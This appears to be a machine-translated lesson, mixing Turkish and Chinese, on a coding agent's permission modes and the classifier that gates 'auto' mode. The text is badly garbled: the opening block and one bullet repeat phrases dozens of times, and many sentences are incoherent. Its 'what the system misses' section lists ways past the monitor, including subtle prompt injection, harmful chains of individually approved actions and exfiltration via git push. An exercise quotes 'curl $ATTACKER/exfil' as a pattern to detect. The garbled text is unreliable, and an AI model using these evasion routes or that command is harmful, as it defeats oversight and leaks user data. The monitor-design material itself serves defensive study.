# Özgür Ajanın Yetki Şekili

> 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶梯 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限阶段 权限`auto`权限模式 独立的分类器模型的取代动作批准: 权限模式 独立分类器模型的取代动作批准: 权限模式 取代动作批准: 取代动作批准: 取代动作批准: 取代动作批准: 取代动作批准: 取代动作审核: 取代动作审核: 取代动作审核: 取代动作审核: 取代动作审核: 取代动作审核: 取代动作审核: 取代动作审核: 取代动作审核: 取代动作审核: 取代动作审核: 取代动作审核: 取代动作审核: 取代动作审核: 取代动作审核: 取代动作审核: 取代动作审核: 取代动作审核: 取代动作审核: 取代动作审核: 取代动作审核: 取取取取取的升级: 取代动作审核: 取取取取取取取的动作预算通过`max_turns`和 `max_budget_usd`强制执行──`auto`Yapılandırılabilirlik planın, örgütün etkinliğine, modeline ve tedarikçisine bağlıdır.

**类型：**Öğrenme
**语言：**Python(stdlib,两阶段 sınıflandırıcı simülatörü)
**先修要求：**15 aşama · 01(Uzun ufuk ajanları),15 aşama · 09(Kodlama ajanları manzarası)
**时间：**45 dakika kadar .

## 问题

Sizin makinerdeki özerk kodlama ajanı bağımsız bir güvenlik sınıfıdır. Bu saldırı, bu ajanın tüm dosya sistemlerine, ağlara, kredi kartlarına, herhangi bir tarayıcı sekmesine, herhangi bir terminal açılmasına erişebilmesi için kullanıldığı açıktır.

Claude Code'un yetki sistemi Anthropic tarafından verilen bir cevaptı. Bu bir autonom / not autonomousopen, değil altı model oluşturma yeteneği.

Mühendislik sorusu şu: Bu sistem neyi yakalayabilir, neyi kaybeder ve belirli bir görev için hangi modeli kullanmalı?

## 概念

### 六种权限模式

| 模式 | 行为 | 使用场景 |
|---|---|---|
| `plan` | Agent 提出计划；用户批准整个计划；每个动作在执行前都会被审查 | 不熟悉的任务；接近 prod 的代码；第一次在某个 repo 上使用 agent |
| `default` | 在 UI 中标为 “Manual”。Agent 运行动作；对任何“有风险”的动作提示用户（shell exec、destructive operations、network calls） | 大多数交互式 coding sessions |
| `acceptEdits` | 文件写入自动批准；shell exec 和 network calls 仍然提示 | 跨很多文件的 refactoring pass |
| `auto` | 由一个独立的 classifier model 在每个动作运行前审阅它；阻止任何超出请求范围的升级 | 受限 workspace 中的 long-horizon unattended runs |
| `dontAsk` | 从不提示；未被 permission rules 预先批准的动作一律拒绝 | 临时 sandboxes、CI jobs、research scripts |
| `bypassPermissions` | 批准一切 | 文档说明为“只在你愿意丢弃的 ephemeral containers 内使用” |

(Üstteki isimler ve açık Claude Kod dokümanları birleştirilir;`default`标为 Manual。)

### Bir sayfa anlamak Otomatik Mod

Otomatik Mod ((2026 yılının 3 月 24 日 yayın) ilk olarak modelin onayına verilen yetki modudur.

1. **一个独立的 classifier model。**Bu işlemin her bir önerilen işleminin yürütülmesinden önce, görev ve oturum açıklamasına göre, mevcut durumunu değerlendirerek, istek alanından geçen herhangi bir yükseltmeyi durdurur.
2. **受限的可用性。**Evet mi?`auto`Planın, örgütlerin etkin olup olmadığına, model ve tedarikçiye bağlıdır.

Budget kontrol ve sınıflandırıcı bulunmuyor:

- `max_turns` Bir seans Ortalama toplam 代次数──
- `max_budget_usd` 触发 seansı 中止的美元上限──
- Her aletin hareket sayısı sınırlıdır.`WebFetch`Çağrılar)

### Sistem neyi yakalayabilir?

- Araç girişleri arasında doğrudan enjeksiyon, içinde enjeksiyon talimatları bilinen riskli hareket biçimine yerleştirilmiştir.
- 重复 Araç döngüleri sınıflandırıcı N+1 eylemini N 连续五次几乎相同的行动 N 连续五次与行动 N 连续五次与动作 N 连续五次几乎相同的操作 N 连续五次与动作 N 连续五次与动作 N 连续五次与动作 N 连续五次与动作 N 连续五次与动作 N 连续五次与动作 N 连续五次与动作 N 连续五次与动作 N 连续五次与动作 N 连续五次与动作 N 连续五次与动作 N 连续五次与动作 N 连续五次与动作 N 连续五次与动作 N 连续五次与动作 N 连续五次与动作 N 连续五次与动作 N 连续五次与动作 N 连续五次与动作
- Bu sadece dosya düzenlemesi için bir seansta, açıkça sınırların üzerinden gelen komutlar var.

### Sistem neyi kaçırır?

- **微妙的 prompt injection**, bu davranış düzenlenecek, ancak tek bir işaretli hareket meydana gelmeyecek. Indirekt Cevap Enjeksiyonı tamamen düzeltilebilir bir hata değildir.
- **语义层面的不当行为。**Her tek hareket güvenli görünüyor, ancak birleştirilen oluşum yolları zararlıdır.
- **通过合法渠道 exfiltration。**Verileri sahip olduğunuz dosyalara yazacağım.`git push`Halkın kontrolüne, bir dizi hareket izin verilir ama sorun onların birleştirilmesinde.

### Araştırma ön gösterisi 定位

Antropic 将 Auto Mode 作为研究预览发布.文档明确说明,classifier is a layer防护, not a complete solution: user should use Auto Mode with budgets、allowists、isolated workspaces 和 trajectory audits(Düşünmeler 1216) 结合使用──preview 定位也反映了已记录的评估-vs. deployment gap(Düşünmeler 1)  Offline evals'ın sınıflandırıcısı,实用セッション中可能表现真不同,因为用户上下文是模糊的.

### Bu merdiven iş akışında yer alır.

- Tanınmamış görevler:`plan`Bir kere kötü bir şekilde çalışmaktan daha ucuz bir plan.
- 已知 refactor:`acceptEdits`能省下大量确认点击──
- Gözlemsiz arka plan çalıştırma: Sadece patlama radyusunu ölçtüğünüzde çalışma alanı içinde kullanın `auto`(İşlev belgesi yok, üretim süresi yok, başlıca seçim çıkışı yok)
- Efimeral konteynerler: sadece konteyner olarak kullanılır ve onların kimlikleri terk edilebilir.`dontAsk`- Ne ?`bypassPermissions`Sadece kabul edilebilir.

```figure
autonomy-oversight
```

## Kullan

`code/main.py`Bir eylem-önzet sınıflandırıcısı koymak iki aşamalı bir boru hattı oluşturmak.`auto`模式背后, dosya açıklaması olan iki aşama anlaşması yerine bağımsız bir sınıflandırıcı modelidir. 1. aşama, önerilen hareketlere yönelik ucuz anahtar kelime kuralıdır. 2. aşama daha yavaş bir çok kural değerlendiricisidir.

## - Söyle.

`outputs/skill-permission-mode-picker.md`Görevlerin tanımlanması, doğru yetki sınırları, bütçe sınırları ve ayrımcılık gereksinimlerine uygun olacaktır.

## 练习

1. 运行  İşlem`code/main.py`❖ Hangi sentetik eylem tipi 1 aşamada belirtilmedi ama 2 aşamada yakalanmadı?

2. 扩展 1 aşama kural seti, belli bir bilinen kötü şekli yakalamak için`curl $ATTACKER/exfil`)── benig reaksiyon numune üzerinde yanlış pozitif oranı ölçülüyor──

3. Antropik'in "Agent Loop Nasıl Çalışır" makalesini okuyun.`default`模式下默认触碰的每种外部状态──在无监督运行中`auto`Ön, hangi tek kapı gerekir?

4. 24 saat beklenmedik bir bütçe tasarlayın:`max_turns`- Evet.`max_budget_usd`、 her aletin kapıları、 ‒aletçiler── ‖ açıklayın her sayıdaki nedenleri──

5. 描述一个轨迹:其中的每个单独动作都被分类批准,但组合行为却是错调的──(14 Sınıf 会介绍杀开关和加拿大代币 如何处理这个问题──)

## 关键术语

| 术语 | 人们常说 | 实际含义 |
|---|---|---|
| 权限模式 | “agent 能做多少事” | 控制逐动作批准的六种命名 policy 之一 |
| plan mode | “做任何事前都询问” | Agent 编写计划；用户在执行前批准 |
| acceptEdits | “让它写文件” | 文件写入自动批准；shell exec 仍然提示 |
| auto | “Auto approvals” | 独立的 classifier model 审阅每个动作；阻止超出请求范围的升级 |
| bypassPermissions | “Full YOLO” | 批准一切；预期用于 ephemeral containers |
| Stage 1（simulator） | “Fast keyword check” | `code/main.py` 中针对拟议动作的廉价 rule |
| Stage 2（simulator） | “Deep review” | `code/main.py` 中针对被标记动作的更慢 multi-rule reviewer |
| Research preview | “Not GA” | Anthropic 对 failure mode 仍在被映射的功能所使用的定位 |

## 延伸阅读

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) 权限模式、预算、行动形式──
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) yönetilen hizmet 执行模型。
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) özellik yüzeyi ve Otomatik Mod duyuruları
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) 塑造分類者 判断的理性基層──
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) 关于长视界许可设计的内部视角──
